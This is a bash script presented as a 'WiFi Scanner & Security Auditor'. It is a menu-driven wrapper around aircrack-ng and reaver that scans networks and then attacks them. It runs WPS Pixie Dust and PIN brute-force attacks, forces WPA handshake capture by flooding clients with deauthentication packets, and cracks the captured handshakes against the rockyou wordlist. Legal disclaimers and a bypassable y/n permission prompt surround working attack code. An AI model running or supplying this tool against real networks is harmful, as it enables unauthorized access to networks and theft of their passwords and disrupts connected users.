#!/bin/bash
# ============================================================
#  WiFi Scanner & Security Auditor - অচেনা গেমার
#  Author: অচেনা গেমার
#  Description: A menu-driven WiFi scanning and vulnerability
#               assessment tool for authorized security testing.
#  WARNING: Use only on networks you own or have explicit
#           permission to test. Unauthorized access is illegal.
# ============================================================

# --- Color Definitions ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# --- Global Variables ---
INTERFACE=""
MON_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_SSID=""
CAPTURE_FILE="wifi_capture"

# --- Check Root Privileges ---
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root.${NC}"
   exit 1
fi

# --- Check Required Tools ---
check_dependencies() {
    local missing=()
    for tool in nmcli iwlist iwconfig aircrack-ng airmon-ng airodump-ng aireplay-ng wash reaver; do
        if ! command -v $tool &> /dev/null; then
            missing+=($tool)
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Missing tools: ${missing[*]}${NC}"
        echo -e "${YELLOW}[!] Install them with: sudo apt install aircrack-ng reaver wireless-tools network-manager${NC}"
        echo -e "${YELLOW}[!] Some features may not work.${NC}"
        sleep 2
    fi
}

# --- Banner ---
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                      ║"
    echo "║   ██╗    ██╗██╗███████╗██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗    ║"
    echo "║   ██║    ██║██║██╔════╝██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║    ║"
    echo "║   ██║ █╗ ██║██║█████╗  ██║    ███████╗██║     ███████║██╔██╗ ██║    ║"
    echo "║   ██║███╗██║██║██╔══╝  ██║    ╚════██║██║     ██╔══██║██║╚██╗██║    ║"
    echo "║   ╚███╔███╔╝██║██║     ██║    ███████║╚██████╗██║  ██║██║ ╚████║    ║"
    echo "║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ║"
    echo "║                                                                      ║"
    echo "║              WiFi Scanner & Security Auditor v1.0                    ║"
    echo "║                      Created by: অচেনা গেমার                           ║"
    echo "║                                                                      ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# --- Select Wireless Interface ---
select_interface() {
    echo -e "${YELLOW}[*] Available wireless interfaces:${NC}"
    local ifaces=($(iwconfig 2>/dev/null | grep "IEEE" | awk '{print $1}'))
    if [[ ${#ifaces[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No wireless interface found.${NC}"
        return 1
    fi
    for i in "${!ifaces[@]}"; do
        echo -e "  ${GREEN}$((i+1)).${NC} ${ifaces[$i]}"
    done
    read -p "Select interface number: " choice
    if [[ "$choice" -ge 1 && "$choice" -le "${#ifaces[@]}" ]]; then
        INTERFACE="${ifaces[$((choice-1))]}"
        echo -e "${GREEN}[+] Selected interface: $INTERFACE${NC}"
        return 0
    else
        echo -e "${RED}[!] Invalid selection.${NC}"
        return 1
    fi
}

# --- Enable Monitor Mode ---
enable_monitor_mode() {
    echo -e "${YELLOW}[*] Enabling monitor mode on $INTERFACE...${NC}"
    airmon-ng check kill &>/dev/null
    airmon-ng start $INTERFACE &>/dev/null
    sleep 2
    MON_INTERFACE="${INTERFACE}mon"
    # Check if monitor interface was created differently
    if ! iwconfig $MON_INTERFACE &>/dev/null; then
        MON_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
    fi
    if [[ -z "$MON_INTERFACE" ]]; then
        echo -e "${RED}[!] Failed to enable monitor mode.${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] Monitor mode enabled: $MON_INTERFACE${NC}"
    return 0
}

# --- Disable Monitor Mode ---
disable_monitor_mode() {
    if [[ -n "$MON_INTERFACE" ]]; then
        echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
        airmon-ng stop $MON_INTERFACE &>/dev/null
        sleep 1
        # Restart network manager
        systemctl restart NetworkManager &>/dev/null
        echo -e "${GREEN}[+] Monitor mode disabled.${NC}"
    fi
}

# --- Option 1: WiFi Network Scan ---
wifi_scan() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    WiFi NETWORK SCAN                                 ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    if ! select_interface; then
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "${YELLOW}[*] Scanning for WiFi networks... Please wait.${NC}"
    sleep 1
    
    # Use nmcli for a clean, readable scan
    nmcli dev wifi rescan &>/dev/null
    sleep 3
    local scan_output=$(nmcli -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list 2>/dev/null)
    
    if [[ -z "$scan_output" ]]; then
        echo -e "${RED}[!] No networks found or nmcli not available. Trying iwlist...${NC}"
        scan_output=$(iwlist $INTERFACE scan 2>/dev/null | grep -E "ESSID|Address|Channel|Signal|Encryption" | head -n 50)
    fi
    
    if [[ -z "$scan_output" ]]; then
        echo -e "${RED}[!] Scan failed. Check your interface.${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${GREEN}Available Networks:${NC}\n"
    echo "$scan_output" | nl -w2 -s'. '
    
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "Enter the BSSID (or number from list) to view details, or 'b' to go back: " selection
    
    if [[ "$selection" == "b" || "$selection" == "B" ]]; then
        return
    fi
    
    # If a number was entered, extract the BSSID
    if [[ "$selection" =~ ^[0-9]+$ ]]; then
        TARGET_BSSID=$(echo "$scan_output" | sed -n "${selection}p" | awk '{print $2}')
    else
        TARGET_BSSID="$selection"
    fi
    
    if [[ -z "$TARGET_BSSID" ]]; then
        echo -e "${RED}[!] Invalid selection.${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    show_network_details "$TARGET_BSSID"
}

# --- Show Network Details ---
show_network_details() {
    local bssid="$1"
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    NETWORK DETAILS                                   ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${YELLOW}[*] Fetching details for BSSID: $bssid${NC}\n"
    
    # Get detailed info using nmcli
    local details=$(nmcli -f all dev wifi list 2>/dev/null | grep -i "$bssid")
    
    if [[ -z "$details" ]]; then
        # Fallback to iwlist
        echo -e "${YELLOW}[*] Using iwlist for detailed scan...${NC}"
        iwlist $INTERFACE scan 2>/dev/null | grep -A 20 -i "$bssid"
    else
        echo -e "${WHITE}SSID:${NC}       $(echo "$details" | awk -F':' '{print $2}' | xargs)"
        echo -e "${WHITE}BSSID:${NC}      $bssid"
        echo -e "${WHITE}Channel:${NC}    $(echo "$details" | awk -F':' '{print $3}' | xargs)"
        echo -e "${WHITE}Signal:${NC}     $(echo "$details" | awk -F':' '{print $4}' | xargs) dBm"
        echo -e "${WHITE}Security:${NC}   $(echo "$details" | awk -F':' '{print $5}' | xargs)"
    fi
    
    echo -e "\n${WHITE}Vulnerability Assessment:${NC}"
    
    # Check WPS vulnerability
    if command -v wash &>/dev/null; then
        echo -e "${YELLOW}[*] Checking WPS vulnerability...${NC}"
        if enable_monitor_mode; then
            local wps_info=$(timeout 10 wash -i $MON_INTERFACE 2>/dev/null | grep -i "$bssid")
            if [[ -n "$wps_info" ]]; then
                echo -e "${RED}[!] WPS ENABLED - Potentially vulnerable to WPS PIN attacks.${NC}"
                echo -e "   $wps_info"
            else
                echo -e "${GREEN}[+] No WPS detected.${NC}"
            fi
            disable_monitor_mode
        fi
    fi
    
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "1. Perform WPS Vulnerability Test (Reaver)"
    echo -e "2. Capture WPA Handshake"
    echo -e "3. Back to Scan"
    read -p "Choose an option: " detail_choice
    
    case $detail_choice in
        1) wps_vulnerability_test "$bssid" ;;
        2) capture_handshake "$bssid" ;;
        3) wifi_scan ;;
        *) wifi_scan ;;
    esac
}

# --- Option 2: WPS Vulnerability Test ---
wps_vulnerability_test() {
    local bssid="$1"
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    WPS VULNERABILITY TEST                           ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${RED}[!] LEGAL WARNING: Only test networks you own or have permission to test.${NC}"
    read -p "Do you have permission? (y/n): " confirm
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${YELLOW}[*] Aborting.${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    if ! enable_monitor_mode; then
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] Scanning for WPS-enabled access points...${NC}"
    timeout 15 wash -i $MON_INTERFACE 2>/dev/null | grep -i "$bssid"
    
    echo -e "\n${YELLOW}[*] Starting Reaver attack against $bssid...${NC}"
    echo -e "${YELLOW}[*] This may take a long time. Press Ctrl+C to stop.${NC}"
    echo -e "${YELLOW}[*] Using Pixie Dust attack for faster results...${NC}"
    
    # Try Pixie Dust first (faster)
    timeout 120 reaver -i $MON_INTERFACE -b $bssid -K 1 -vv 2>&1 | tee wps_attack.log
    
    echo -e "\n${YELLOW}[*] If Pixie Dust failed, trying PIN brute-force...${NC}"
    echo -e "${YELLOW}[*] This can take hours. Press Ctrl+C to stop.${NC}"
    
    read -p "Continue with PIN brute-force? (y/n): " brute_confirm
    if [[ "$brute_confirm" == "y" || "$brute_confirm" == "Y" ]]; then
        reaver -i $MON_INTERFACE -b $bssid -vv 2>&1 | tee -a wps_attack.log
    fi
    
    disable_monitor_mode
    echo -e "\n${GREEN}[+] WPS attack completed. Check wps_attack.log for results.${NC}"
    read -p "Press Enter to continue..."
}

# --- Option 3: Capture WPA Handshake ---
capture_handshake() {
    local bssid="$1"
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    WPA HANDSHAKE CAPTURE                            ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${RED}[!] LEGAL WARNING: Only capture handshakes from networks you own.${NC}"
    read -p "Do you have permission? (y/n): " confirm
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        echo -e "${YELLOW}[*] Aborting.${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    if ! enable_monitor_mode; then
        read -p "Press Enter to continue..."
        return
    fi
    
    # Get channel
    TARGET_CHANNEL=$(nmcli -f CHAN dev wifi list 2>/dev/null | grep -i "$bssid" | awk '{print $1}')
    if [[ -z "$TARGET_CHANNEL" ]]; then
        echo -e "${YELLOW}[*] Channel not found. Starting full scan...${NC}"
        TARGET_CHANNEL=""
    fi
    
    echo -e "\n${YELLOW}[*] Starting packet capture on $bssid (Channel: ${TARGET_CHANNEL:-all})...${NC}"
    
    if [[ -n "$TARGET_CHANNEL" ]]; then
        airodump-ng --bssid $bssid -c $TARGET_CHANNEL -w $CAPTURE_FILE $MON_INTERFACE &>/dev/null &
    else
        airodump-ng --bssid $bssid -w $CAPTURE_FILE $MON_INTERFACE &>/dev/null &
    fi
    
    AIRODUMP_PID=$!
    sleep 5
    
    echo -e "${YELLOW}[*] Sending deauthentication packets to force handshake...${NC}"
    aireplay-ng --deauth 15 -a $bssid $MON_INTERFACE &>/dev/null
    
    echo -e "${YELLOW}[*] Waiting for handshake capture (30 seconds)...${NC}"
    sleep 30
    
    kill $AIRODUMP_PID 2>/dev/null
    
    # Check for handshake
    if ls ${CAPTURE_FILE}-*.cap &>/dev/null; then
        local cap_file=$(ls -t ${CAPTURE_FILE}-*.cap | head -n1)
        if aircrack-ng "$cap_file" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "${GREEN}[+] Handshake captured successfully! File: $cap_file${NC}"
            echo -e "${YELLOW}[*] You can crack it with: aircrack-ng -w <wordlist> $cap_file${NC}"
        else
            echo -e "${YELLOW}[*] Handshake not found in $cap_file. Try again with more time.${NC}"
        fi
    else
        echo -e "${RED}[!] No capture file created.${NC}"
    fi
    
    disable_monitor_mode
    read -p "Press Enter to continue..."
}

# --- Option 4: Crack WPA Password ---
crack_password() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    WPA PASSWORD CRACKING                            ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${YELLOW}[*] Available capture files:${NC}"
    ls -t *.cap 2>/dev/null | head -n 10
    echo ""
    read -p "Enter capture file name: " cap_file
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found.${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] Common wordlist locations:${NC}"
    echo -e "  1. /usr/share/wordlists/rockyou.txt"
    echo -e "  2. /usr/share/wordlists/rockyou.txt.gz"
    echo -e "  3. Custom path"
    read -p "Select wordlist (1/2/3): " wl_choice
    
    local wordlist=""
    case $wl_choice in
        1) wordlist="/usr/share/wordlists/rockyou.txt" ;;
        2) 
            if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
                gunzip -k "/usr/share/wordlists/rockyou.txt.gz" 2>/dev/null
            fi
            wordlist="/usr/share/wordlists/rockyou.txt"
            ;;
        3) read -p "Enter wordlist path: " wordlist ;;
        *) wordlist="/usr/share/wordlists/rockyou.txt" ;;
    esac
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found: $wordlist${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] Starting aircrack-ng... This may take a while.${NC}"
    aircrack-ng -w "$wordlist" "$cap_file"
    
    read -p "Press Enter to continue..."
}

# --- Option 5: About ---
show_about() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                    ABOUT THIS TOOL                                   ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${WHITE}Tool Name:${NC}    WiFi Scanner & Security Auditor"
    echo -e "${WHITE}Version:${NC}      1.0"
    echo -e "${WHITE}Created by:${NC}   অচেনা গেমার"
    echo -e "${WHITE}Purpose:${NC}      Educational security auditing and network analysis"
    echo ""
    echo -e "${WHITE}Features:${NC}"
    echo -e "  • WiFi Network Scanning (nmcli / iwlist)"
    echo -e "  • Network Detail Viewing (SSID, BSSID, Channel, Signal, Security)"
    echo -e "  • WPS Vulnerability Testing (wash + reaver)"
    echo -e "  • WPA Handshake Capture (airodump-ng + aireplay-ng)"
    echo -e "  • WPA Password Cracking (aircrack-ng)"
    echo ""
    echo -e "${WHITE}Dependencies:${NC}"
    echo -e "  aircrack-ng suite, reaver, wash, wireless-tools, network-manager"
    echo ""
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}  LEGAL DISCLAIMER:${NC}"
    echo -e "${RED}  This tool is for EDUCATIONAL and AUTHORIZED security testing only.${NC}"
    echo -e "${RED}  Using this tool on networks you do not own or have permission${NC}"
    echo -e "${RED}  to test is ILLEGAL and may result in criminal prosecution.${NC}"
    echo -e "${RED}  The author assumes no responsibility for misuse.${NC}"
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    read -p "Press Enter to continue..."
}

# --- Main Menu ---
main_menu() {
    while true; do
        show_banner
        echo -e "${WHITE}  ┌──────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${WHITE}  │                      MAIN MENU                               │${NC}"
        echo -e "${WHITE}  ├──────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${WHITE}  │                                                              │${NC}"
        echo -e "${WHITE}  │   ${GREEN}[1]${NC}  ${WHITE}WiFi Network Scan${NC}                                      ${WHITE}│${NC}"
        echo -e "${WHITE}  │   ${GREEN}[2]${NC}  ${WHITE}Vulnerability Test (WPS)${NC}                               ${WHITE}│${NC}"
        echo -e "${WHITE}  │   ${GREEN}[3]${NC}  ${WHITE}Capture WPA Handshake${NC}                                  ${WHITE}│${NC}"
        echo -e "${WHITE}  │   ${GREEN}[4]${NC}  ${WHITE}Crack WPA Password${NC}                                     ${WHITE}│${NC}"
        echo -e "${WHITE}  │   ${GREEN}[5]${NC}  ${WHITE}About / Help${NC}                                           ${WHITE}│${NC}"
        echo -e "${WHITE}  │   ${RED}[0]${NC}  ${WHITE}Exit${NC}                                                   ${WHITE}│${NC}"
        echo -e "${WHITE}  │                                                              │${NC}"
        echo -e "${WHITE}  └──────────────────────────────────────────────────────────────┘${NC}"
        echo ""
        read -p "  Select an option [0-5]: " choice
        
        case $choice in
            1) wifi_scan ;;
            2) 
                if ! select_interface; then
                    read -p "Press Enter to continue..."
                    continue
                fi
                read -p "Enter target BSSID: " target_bssid
                if [[ -n "$target_bssid" ]]; then
                    wps_vulnerability_test "$target_bssid"
                fi
                ;;
            3) 
                if ! select_interface; then
                    read -p "Press Enter to continue..."
                    continue
                fi
                read -p "Enter target BSSID: " target_bssid
                if [[ -n "$target_bssid" ]]; then
                    capture_handshake "$target_bssid"
                fi
                ;;
            4) crack_password ;;
            5) show_about ;;
            0) 
                echo -e "\n${GREEN}[+] Exiting. Stay ethical!${NC}\n"
                # Clean up monitor mode if active
                disable_monitor_mode
                exit 0
                ;;
            *) 
                echo -e "${RED}[!] Invalid option.${NC}"
                sleep 1
                ;;
        esac
    done
}

# --- Script Entry Point ---
check_dependencies
main_menu
